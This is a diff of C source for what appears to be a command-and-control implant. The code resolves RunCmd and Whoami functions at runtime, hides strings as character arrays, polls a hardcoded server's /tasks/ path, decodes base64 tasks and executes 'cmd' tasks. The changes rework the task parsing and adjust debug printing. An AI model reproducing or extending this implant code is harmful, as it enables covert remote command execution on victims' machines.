@@ -782,13 +782,15 @@ CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
 
 CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
-    CHAR* tmpJson = json;  // myStrtok modifies the string itself
+    //CHAR* tmpJson = json;
     CHAR* task;
     CHAR delim = { '\n' };
-    CHAR* token = myStrtok(tmpJson, delim, FALSE);
+    //CHAR* token = myStrtok(tmpJson, delim, FALSE);
+    CHAR* token = myStrtok(json, delim, FALSE);
     CHAR blacklist[] = { '[', ']', '\0' };
 
-    if (tmpJson[0] == '[' && tmpJson[1] == ']')
+    //if (tmpJson[0] == '[' && tmpJson[1] == ']')
+    if (json[0] == '[' && json[1] == ']')
     {
         return NULL;
     }
@@ -800,7 +802,8 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
         {
             if (token[j] == blacklist[i])
             {
-                token = myStrtok(tmpJson, delim, FALSE);
+                //token = myStrtok(tmpJson, delim, FALSE);
+                token = myStrtok(json, delim, FALSE);
                 i=-1;
                 break;
             }
@@ -810,13 +813,16 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     // dont look
     *taskId = myTrim(token, ' ');
     *taskId = myEndTrim(*taskId, ',');
-    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    //task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    task = myTrim(myStrtok(json, delim, FALSE), ' ');
     task = myEndTrim(task, ',');
     task = myTrim(task, '"');
-    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    //*taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    *taskType = myTrim(myStrtok(json, delim, FALSE), ' ');
     *taskType= myEndTrim(*taskType, ',');
     *taskType = myTrim(*taskType, '"');
-    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    ///*uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    *uuid = myTrim(myStrtok(json, delim, FALSE), ' ');
     *uuid = myEndTrim(*uuid, ',');
     *uuid = myTrim(*uuid, '"');
 
@@ -944,9 +950,7 @@ void myMain()
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
-    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
-    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
 
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
@@ -985,6 +989,7 @@ void myMain()
             continue;
         }
 
+        ((PRINTF)api->printf)("\n%s\n", jsonResponse);
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
         if (b64Task == NULL)
@@ -1015,6 +1020,9 @@ void myMain()
                 NULL,
                 NULL
         );
+        
+        ((PRINTF)api->printf)("\n%s\n", task);
+        ((PRINTF)api->printf)("\nHere: %s\n", taskType);
 
         if (my_strcmp(taskType, "cmd") == 0)
         {
@@ -1030,7 +1038,7 @@ void myMain()
         else
         {
             taskOutput = "oops";
-            ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
+            ((PRINTF)api->printf)("\nunknown task type, you f'ed up, this should never happen\n");
         }
 
 
